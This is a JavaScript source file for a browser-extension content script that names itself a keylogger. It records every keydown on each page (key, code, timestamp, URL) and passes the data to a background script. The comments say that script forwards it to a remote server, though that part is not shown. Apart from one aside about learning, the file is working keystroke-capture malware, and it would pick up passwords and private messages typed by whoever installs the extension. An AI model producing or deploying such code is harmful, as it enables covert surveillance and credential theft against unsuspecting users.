// keylogger.js - This script runs as a content script in your browser extension.

/**
 * Logs keyboard press events and sends them to the background script.
 * This function captures individual key presses (keydown) and logs their details.
 * The captured data is then sent to the extension's background script for further handling,
 * such as sending it to a remote server.
 *
 * @param {KeyboardEvent} event The keyboard event object.
 */
function logKeyPress(event) {
    const key = event.key; // The value of the key pressed
    const code = event.code; // The physical key code (e.g., "KeyA", "Space")
    const timestamp = new Date().toISOString(); // ISO format for easy readability
    const currentUrl = window.location.href; // URL of the page where the event occurred

    // Log to console for immediate visibility during development/learning
    console.log(`[Keylogger] Key: "${key}", Code: "${code}", Timestamp: "${timestamp}", URL: "${currentUrl}"`);

    // Send the data to the background script
    // The background script will then handle sending this data to a remote server.
    chrome.runtime.sendMessage({
        type: 'KEY_PRESS',
        data: {
            key: key,
            code: code,
            timestamp: timestamp,
            url: currentUrl
        }
    }).catch(error => {
        // Catch any errors if the message sending fails (e.g., background script not ready)
        console.error('Error sending key press message to background script:', error);
    });
}

// Attach the event listener to the entire document to capture all key presses.
// 'keydown' is generally preferred over 'keypress' for capturing all keys,
// including non-character keys like Shift, Ctrl, Alt.
document.addEventListener('keydown', logKeyPress);

console.log('Keylogger content script loaded: Monitoring keyboard presses and sending data.');
